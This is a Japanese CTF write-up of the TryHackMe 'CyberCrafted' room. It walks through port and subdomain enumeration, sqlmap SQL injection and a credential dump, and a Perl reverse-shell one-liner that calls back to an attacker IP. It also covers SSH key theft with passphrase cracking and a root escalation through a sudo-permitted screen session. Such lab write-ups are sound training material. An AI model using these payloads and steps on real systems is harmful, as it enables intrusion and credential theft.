# CyberCrafted CTF

https://tryhackme.com/room/cybercrafted

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.36.170
root@ip-10-10-80-185:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-09 06:56 BST
Nmap scan report for 10.10.36.170
Host is up (0.00030s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft
MAC Address: 02:83:E8:EC:47:1F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
root@ip-10-10-80-185:~# sudo nmap -sV -p22,80,25565 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-09 06:57 BST
Nmap scan report for 10.10.36.170
Host is up (0.00018s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
MAC Address: 02:83:E8:EC:47:1F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds
```

SSH, HTTP, Minecraft!

### サブドメイン

```shell
$ ffuf -u http://cybercrafted.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.cybercrafted.thm ' -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 255ms]
www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 4337ms]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 4356ms]
www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 257ms]
www.store               [Status: 403, Size: 291, Words: 20, Lines: 10, Duration: 260ms]
:: Progress: [4989/4989] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```

admin, store, www がある。store はおそらく内部用か？

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

root@ip-10-10-80-185:~# gobuster dir -x=txt,php -u http://www.cybercrafted.thm -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.cybercrafted.thm
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 285]
/assets               (Status: 301) [Size: 329] [--> http://www.cybercrafted.thm/assets/]
/.htaccess            (Status: 403) [Size: 285]
/.htaccess.txt        (Status: 403) [Size: 285]
/.htaccess.php        (Status: 403) [Size: 285]
/.htpasswd.txt        (Status: 403) [Size: 285]
/.htpasswd            (Status: 403) [Size: 285]
/.htpasswd.php        (Status: 403) [Size: 285]
/secret               (Status: 301) [Size: 329] [--> http://www.cybercrafted.thm/secret/]
/server-status        (Status: 403) [Size: 285]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

www の下に /secret を発見。

```shell
root@ip-10-10-80-185:~# gobuster dir -x=txt,php -u http://admin.cybercrafted.thm -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.cybercrafted.thm
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 287]
/assets               (Status: 301) [Size: 333] [--> http://admin.cybercrafted.thm/assets/]
/.htaccess.txt        (Status: 403) [Size: 287]
/.htaccess.php        (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 287]
/.htpasswd.php        (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/.htpasswd.txt        (Status: 403) [Size: 287]
/index.php            (Status: 200) [Size: 937]
/login.php            (Status: 302) [Size: 0] [--> /]
/panel.php            (Status: 302) [Size: 0] [--> /]
/server-status        (Status: 403) [Size: 287]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

admin の下に /index.php, /login.php, /panel.php

### ステガノグラフィー

/secret の中にあった画像ファイル

#### background-1.jpg

長い文字列があったが、微妙なところ。

```shell
$ strings -n 10 ./background-1.jpg
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
0Ba$34@RP`q
&?&?.&&&&&&&&&&&&& \
F&&&&&&&&&&&&&&&&ffg3
;&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&?
4=U+%TJsc`
ko-frnT5kSW
3@a#4BRqP$
fffffffffff_
fffffffffff
0jNQNV9_,_
JVUW42LOM4QHI2DSN52WO2BAORUGKIDTMVRXE
```

#### herobrine-3.jpeg

謎のエンコード文字列が出てきた。

```shell
$ stegseek ./herobrine-3.jpeg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "secret"
[i] Original filename: "herobrine.txt".
[i] Extracting to "herobrine-3.jpeg.out".
```

```shell
$ cat ./herobrine-3.jpeg.out
IDDOJQWM5BAMEQGIZLBMQQEKTSEEE======
```

#### pack-2.png

何か出てきたが、何のデータかは不明。

```shell
$ binwalk -Me ./pack-2.png
/usr/lib/python3/dist-packages/binwalk/core/magic.py:431: SyntaxWarning: invalid escape sequence '\.'
  self.period = re.compile("\.")

Scan Time:     2025-05-09 02:14:22
Target File:   /home/kali/CTF/0509/pack-2.png
MD5 Checksum:  14cbb7257b910540ccb5fba17814aac9
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 128 x 128, 8-bit/color RGBA, non-interlaced
188           0xBC            Zlib compressed data, compressed


Scan Time:     2025-05-09 02:14:22
Target File:   /home/kali/CTF/0509/_pack-2.png.extracted/BC
MD5 Checksum:  fa90306528b42d3ffcef1be37d1769b2
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
```

```shell
$ file _pack-2.png.extracted/BC
_pack-2.png.extracted/BC: data
```

また、admin の logBackground.png からも不明なデータが出てきた。

## ログイン画面

sqlmap を実行したら、uname に SQL インジェクションの脆弱性がある（Sleep が機能する）が、バイパスやダンプまでは出来なかった。

```shell
sqlmap -r ./login.txt --dbs

POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=aaa' AND (SELECT 4490 FROM (SELECT(SLEEP(5)))KyFB) AND 'ihfI'='ihfI&pwd=bbb
```

その他のペイロードを試しても効果なし。

```shell
ffuf -u http://admin.cybercrafted.thm/login.php -c -w ./Auth_Bypass2.txt -X POST -d 'uname=FUZZ&pwd=bbb' -fs 1435 -H 'Content-Type: application/x-www-form-urlencoded
```

## store

まだ試していない store サブドメインをディレクトリ検索。

```shell
root@ip-10-10-87-54:~# gobuster dir -x=txt,php -u http://store.cybercrafted.thm -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 287]
/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
/.htaccess            (Status: 403) [Size: 287]
/.htaccess.php        (Status: 403) [Size: 287]
/.htaccess.txt        (Status: 403) [Size: 287]
/.htpasswd.php        (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/.htpasswd.txt        (Status: 403) [Size: 287]
/search.php           (Status: 200) [Size: 838]
/server-status        (Status: 403) [Size: 287]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/search.php を発見。リクエストをテキスト保存し、

DB 名列挙

```shell
sqlmap -r ./search.txt --dbs --batch

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapp
```

webapp データベースの、テーブル名列挙

```shell
sqlmap -r ./search.txt -D webapp --tables --batch

Database: webapp
[2 tables]
+-------+
| admin |
| stock |
+-------+
```

全てダンプ

```shell
sqlmap -r ./search.txt -D webapp --dump-all --batch

Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd................................ | xX[REDACTED]Xx |
| 4  | THM{................................}    | web_flag            |
+----+------------------------------------------+---------------------+
```

- admin ユーザー名判明
- Hash 値からパスワード判明（CrackStation）
- Web フラグ判明

```shell
Database: webapp
Table: stock
[139 entries]
+-----+------+------------------------+--------+
| id  | cost | item                   | amount |
+-----+------+------------------------+--------+
| 4   | 0.5$ | Acacia Boat            | 1x     |
| 5   | 0.5$ | Armor Stand            | 1x     |
| 6   | 0.2$ | Beetroot Seeds         | 16x    |
| 7   | 0.5$ | Birch Boat             | 1x     |
| 8   | 1$   | Bottle of Enchanting   | 64x    |
| 9   | 0.5$ | Bow                    | 1x     |
（略）
+-----+------+------------------------+--------+
```

## システムコマンド画面

入手した認証情報を使ってログインしたら、システムコマンド実行画面が表示される。

とりあえずこれでリバースシェルは取得できるが、

```shell
perl -e 'use Socket;$i="10.2.22.182";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

```shell
ls /home

cybercrafted
xxultimatecreeperxx
```

```shell
ls -al /home/xxultimatecreeperxx

total 32
drwxr-xr-x 5 xxultimatecreeperxx xxultimatecreeperxx 4096 Oct 15  2021 .
drwxr-xr-x 4 root                root                4096 Jun 27  2021 ..
lrwxrwxrwx 1 root                root                   9 Sep 12  2021 .bash_history -> /dev/null
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  220 Jun 27  2021 .bash_logout
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 3771 Jun 27  2021 .bashrc
drwx------ 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .cache
drwx------ 3 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .gnupg
-rw-rw-r-- 1 xxultimatecreeperxx xxultimatecreeperxx    0 Jun 27  2021 .hushlogin
-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  807 Jun 27  2021 .profile
drwxrwxr-x 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .ssh
lrwxrwxrwx 1 root                root                   9 Oct 15  2021 .viminfo -> /dev/null
```

SSH 秘密鍵を入手

```shell
cat /home/xxultimatecreeperxx/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
（中略）
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----
```

パスフレーズは下記でクラックできた。（先頭のファイル名は削除して）

```shell
ssh2john id_rsa_mine > hash.txt

hashcat -m 22931 -a 0 hash.txt rockyou.txt
```

SSH 接続成功。

```shell
$ ssh -i ./id_rsa_mine xxultimatecreeperxx@10.10.36.170
Enter passphrase for key './id_rsa_mine':
xxultimatecreeperxx@cybercrafted:~$
```

## 権限昇格１

minecraft グループに入っている。

```shell
xxultimatecreeperxx@cybercrafted:~$ id
uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
```

グループオーナーのファイル

```shell
xxultimatecreeperxx@cybercrafted:~$ find / -group minecraft -type f -not -path "/proc/*" 2>/dev/null
/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted/help.yml
/opt/minecraft/cybercrafted/commands.yml
/opt/minecraft/cybercrafted/world/level.dat_mcr
（略）
/opt/minecraft/cybercrafted/logs/2021-09-12-1.log.gz
/opt/minecraft/cybercrafted/server.properties
/opt/minecraft/cybercrafted/ops.txt
/opt/minecraft/cybercrafted/bukkit.yml
/opt/minecraft/cybercrafted/banned-ips.txt
/opt/minecraft/cybercrafted/banned-players.txt
```

サーバーフラグ

```shell
xxultimatecreeperxx@cybercrafted:~$ cat /opt/minecraft/minecraft_server_flag.txt
THM{ba9.............................}
```

note.txt

```shell
xxultimatecreeperxx@cybercrafted:~$ cat /opt/minecraft/note.txt
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
```

LoginSystem プラグインの中にパスワードファイルがある。

```shell
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat ./passwords.yml
cybercrafted: dcb..............................
madrinch: 42f74...............................
```

cybercrafted のハッシュが https://md5hashing.net/hash/md5 で割れた。

su で昇格成功。

```shell
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ su cybercrafted
Password:
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$
```

```shell
cybercrafted@cybercrafted:~$ ls -al
total 32
drwxr-x--- 4 cybercrafted cybercrafted 4096 Sep 12  2021 .
drwxr-xr-x 4 root         root         4096 Jun 27  2021 ..
lrwxrwxrwx 1 root         root            9 Sep 12  2021 .bash_history -> /dev/null
-rwxr-x--- 1 cybercrafted cybercrafted  220 Jun 27  2021 .bash_logout
-rwxr-x--- 1 cybercrafted cybercrafted 3771 Jun 27  2021 .bashrc
drwx------ 2 cybercrafted cybercrafted 4096 Sep 12  2021 .cache
drwx------ 3 cybercrafted cybercrafted 4096 Sep 12  2021 .gnupg
-rwxr-x--- 1 cybercrafted cybercrafted  807 Jun 27  2021 .profile
-rw-r----- 1 cybercrafted cybercrafted   38 Jun 27  2021 user.txt
```

ユーザーフラグゲット。

```shell
cybercrafted@cybercrafted:~$ cat user.txt
THM{.........................}
```

## 権限昇格２

```shell
cybercrafted@cybercrafted:~$ sudo -l
[sudo] password for cybercrafted:
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```

```shell
sudo /usr/bin/screen -r cybercrafted
```

を実行すると、下記のプロセス（Minecraft の CUI 管理システム）のセッションを再開することになる。

```shell
root     20516  0.0  0.1  30276  3332 ?        Ss   08:27   0:00 /usr/bin/SCREEN -DmS cybercrafted /usr/bin/java -Xmx256m -jar craftbukkit-1.7.2-server.jar nogui
```

https://bukkit.fandom.com/wiki/CraftBukkit_Commands にコマンドのリストがある。

stop を実行したら、セッション自体が終了してしまった。（自動的にすぐ再開される）

```shell
>stop
```

screen の仕様として、Ctrl+a -> c と入力することでシェルを取得できた。

```shell
# id
uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
# ls -al /root
total 52
drwx------  6 root root  4096 Oct 15  2021 .
drwxr-xr-x 24 root root  4096 Sep 30  2021 ..
lrwxrwxrwx  1 root root     9 Sep 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Jun 27  2021 .cache
drwx------  3 root root  4096 Jun 27  2021 .gnupg
drwxr-xr-x  3 root root  4096 Oct  4  2021 .local
-rw-------  1 root root   664 Sep 12  2021 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r-----  1 root root    38 Jun 27  2021 root.txt
drwx------  2 root root  4096 Jun 27  2021 .ssh
-rw-------  1 root root 10959 Oct 15  2021 .viminfo
# cat /root/root.txt
THM{8bb.........................}
```

ルートフラグゲット！

## 振り返り

- ステガノは罠。
- いつもの悪い癖で、store サブドメインは内部アクセス用だろうと決めつけていたため、ディレクトリ探索するのが遅れて時間を無駄にした。この辺は機械的にやらなければいけない。
- cybercrafted ユーザーのパスワードを自分は https://md5hashing.net/hash/md5 から割ったが、CTF 公開当時にここで割れたかは非常に疑わしい。同じ場所にあるログファイルから入手するのが本筋だったと思われる。
- screen コマンドからシェルを起動できるのは知らなかった。勉強になった。
